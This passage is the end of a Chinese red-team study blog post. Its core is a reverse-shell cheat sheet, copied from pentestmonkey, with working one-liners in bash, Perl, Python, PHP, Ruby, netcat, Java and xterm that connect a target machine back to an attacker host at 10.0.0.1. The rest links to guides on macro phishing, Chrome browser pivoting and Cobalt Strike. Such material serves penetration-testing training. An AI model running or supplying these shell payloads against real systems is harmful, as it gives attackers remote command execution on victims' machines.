href="https://www.jianshu.com/p/6df51799cd9d">https://www.jianshu.com/p/6df51799cd9d</a> —基础介绍钓鱼</p></li><li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39379812/article/details/90679722">https://blog.csdn.net/qq_39379812/article/details/90679722</a> –复现、实战</p></li><li><p><a target="_blank" rel="noopener" href="https://blog.51cto.com/13587123/2151193">https://blog.51cto.com/13587123/2151193</a> –老文章</p></li></ul><hr><h4 id="Word文档-云宏代码钓鱼"><a href="#Word文档-云宏代码钓鱼" class="headerlink" title="Word文档-云宏代码钓鱼"></a>Word文档-云宏代码钓鱼</h4><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1518725">https://cloud.tencent.com/developer/article/1518725</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2496">https://xz.aliyun.com/t/2496</a></p><p>两篇复现~~</p><hr><h2 id="4、APP密码算法通用分析方法"><a href="#4、APP密码算法通用分析方法" class="headerlink" title="4、APP密码算法通用分析方法"></a>4、APP密码算法通用分析方法</h2><ul><li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4571625">https://my.oschina.net/u/4587690/blog/4571625</a> –原文</li></ul><hr><h2 id="5、Linux下反弹she命令"><a href="#5、Linux下反弹she命令" class="headerlink" title="5、Linux下反弹she命令"></a>5、Linux下反弹she命令</h2><p>Hackthebox经典提权：</p><p><strong>Bash</strong><br>Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><p><strong>PERL</strong><br>Here’s a shorter, feature-free version of the perl-reverse-shell:</p><pre><code class="hljs PERL">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></code></pre><p>There’s also an alternative PERL revere shell here.</p><p><strong>Python</strong><br>This was tested under Linux / Python 2.7:</p><pre><code class="hljs Python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span>
<span class="hljs-number">1</span></code></pre><p><strong>PHP</strong><br>This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…</p><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></code></pre><p>If you want a .php file to upload, see the more featureful and robust php-reverse-shell.</p><p><strong>Ruby</strong></p><pre><code class="hljs ruby">ruby -rsocket -e<span class="hljs-string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre><p><strong>Netcat</strong><br>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p><pre><code class="hljs netcat">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234</code></pre><p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1234</span> &gt;<span class="hljs-regexp">/tmp/</span>f</code></pre><p><strong>Java</strong></p><pre><code class="hljs java">r = Runtime.getRuntime()
p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])
p.waitFor()</code></pre><p>[Untested submission from anonymous reader]</p><p><strong>xterm</strong><br>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p><pre><code class="hljs xterm">xterm -display 10.0.0.1:1</code></pre><p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p><pre><code class="hljs xterm">Xnest :1</code></pre><p>You’ll need to authorise the target to connect to you (command also run on your host):</p><pre><code class="hljs nginx"><span class="hljs-attribute">xhost</span> +targetip</code></pre><ul><li><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> –参考文章</li></ul><hr><p>shell文章：</p><ul><li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/p0pl4r/p/10643541.html">https://www.cnblogs.com/p0pl4r/p/10643541.html</a></p></li><li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p></li><li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a> –Linux反弹shell（一）文件描述符与重定向</p></li></ul><ul><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a> –Linux 反弹shell（二）反弹shell的本质</li></ul><p>打过靶机的应该都会…</p><hr><h2 id="6、Browser-Pivot-for-Chrome"><a href="#6、Browser-Pivot-for-Chrome" class="headerlink" title="6、Browser Pivot for Chrome"></a>6、Browser Pivot for Chrome</h2><ul><li><p><a target="_blank" rel="noopener" href="https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/">https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/</a> –全英文篇</p></li><li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4417">https://xz.aliyun.com/t/4417</a> –Browser Pivot for Chrome</p></li><li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/102725129">https://blog.csdn.net/weixin_44677409/article/details/102725129</a> –Cobalt Strike使用教程一</p></li><li><p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf</a> –CS非常详细教程 pdf版本，感谢QAX</p></li></ul><p>还可以参考书籍…</p><hr><p>到这里就结束打入内网的篇章了，将开启命令篇章!</p></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/">渗透攻击红队百科全书</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/28ca3946">http://www.secice.cn/p/28ca3946</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/b25a2f1c"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">红队攻防学习之命令与控制</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/a184e79"><span class="hidden-mobile">红队攻防学习之信息收集</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/qipao.js"></script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/jingtaisidai.js"></script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>